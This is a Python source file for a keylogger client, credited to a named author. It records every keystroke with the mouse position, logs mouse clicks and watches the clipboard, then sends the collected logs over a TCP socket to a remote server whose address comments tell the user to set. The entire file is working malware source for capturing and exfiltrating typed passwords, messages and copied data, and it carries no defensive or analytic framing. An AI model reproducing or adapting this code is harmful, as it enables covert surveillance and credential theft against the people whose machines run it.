import pynput
from pynput import keyboard, mouse
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import socket
import time
import random
import pyperclip
from colorama import init, Fore, Style

init(autoreset=True)

print(f"{Fore.MAGENTA}=============================================================")
print(f"{Fore.GREEN}Keylogger Client by a_lonely_ooo")
print(f"{Fore.GREEN}     Author: Jayansh Aryan")
print(f"{Fore.MAGENTA}=============================================================")
print(f"{Fore.RED}Initializing keylogger...{Style.RESET_ALL}")

SERVER_HOST = '127.0.0.1'  # Change to your server IP
SERVER_PORT = 7335         # Change to your server port

# Buffers
keystrokes = []
last_clipboard = ""
sock = None
mouse_controller = pynput.mouse.Controller()
connection_established = False
connection_time = None

def connect_socket():
    """Establish socket connection and set connection time"""
    global sock, connection_established, connection_time
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((SERVER_HOST, SERVER_PORT))
        sock.settimeout(None)
        connection_established = True
        connection_time = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"{Fore.GREEN}Connected to server at {connection_time}{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}Connection failed: {e}{Style.RESET_ALL}")
        sock = None
        return False

def on_press(key):
    """Capture keystrokes with mouse position (only after connection)"""
    if not connection_established:
        return
    
    try:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        mouse_pos = mouse_controller.position
        k = str(key).replace("'", "")
        entry = f"[{timestamp}] Key: {k}, MousePos: {mouse_pos}"
        keystrokes.append(entry)
    except Exception:
        pass

def on_click(x, y, button, pressed):
    """Capture mouse button presses (only after connection)"""
    if not connection_established or not pressed:
        return
    
    try:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        button_name = {
            pynput.mouse.Button.left: "Left",
            pynput.mouse.Button.right: "Right",
            pynput.mouse.Button.middle: "Middle"
        }.get(button, str(button))
        entry = f"[{timestamp}] Mouse: {button_name}, Pos: ({x}, {y})"
        keystrokes.append(entry)
    except Exception:
        pass

def monitor_clipboard():
    """Monitor clipboard changes (only after connection)"""
    global last_clipboard
    if not connection_established:
        return
    
    try:
        current_clipboard = pyperclip.paste()
        if current_clipboard != last_clipboard and current_clipboard.strip():
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            try:
                current_clipboard.encode('utf-8')
                entry = f"[{timestamp}] Clipboard: {current_clipboard}"
            except UnicodeEncodeError:
                entry = f"[{timestamp}] Clipboard: [Non-UTF8 data]"
            keystrokes.append(entry)
            last_clipboard = current_clipboard
    except Exception:
        pass

def send_keystrokes():
    """Send data with connection management"""
    global sock, connection_established
    
    while True:
        try:
            # First establish connection
            if not connection_established:
                if connect_socket():
                    continue
                else:
                    time.sleep(5)
                    continue
            
            # Only process events after connection is established
            monitor_clipboard()
            
            if keystrokes and sock:
                try:
                    # Only send logs that occurred after connection
                    filtered_logs = [
                        log for log in keystrokes 
                        if log >= f"[{connection_time}]"
                    ]
                    
                    if filtered_logs:
                        data = '\n'.join(filtered_logs).encode('utf-8')
                        sock.sendall(data)
                        keystrokes.clear()
                except Exception as e:
                    print(f"{Fore.RED}Connection lost: {e}{Style.RESET_ALL}")
                    sock.close()
                    sock = None
                    connection_established = False
                    connection_time = None
            
            time.sleep(0.1)
            
        except KeyboardInterrupt:
            if connection_established:
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                mouse_pos = mouse_controller.position
                entry = f"[{timestamp}] Ctrl+C, MousePos: {mouse_pos}"
                keystrokes.append(entry)
            continue
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            time.sleep(1)

def main():
    """Start listeners with connection awareness"""
    try:
        with KeyboardListener(on_press=on_press) as k_listener, \
             MouseListener(on_click=on_click) as m_listener:
            
            print(f"{Fore.YELLOW}Waiting for server connection...{Style.RESET_ALL}")
            send_keystrokes()
            
            k_listener.join()
            m_listener.join()
            
    except Exception as e:
        print(f"{Fore.RED}Fatal error: {e}{Style.RESET_ALL}")
        if sock:
            sock.close()

if __name__ == "__main__":
    main()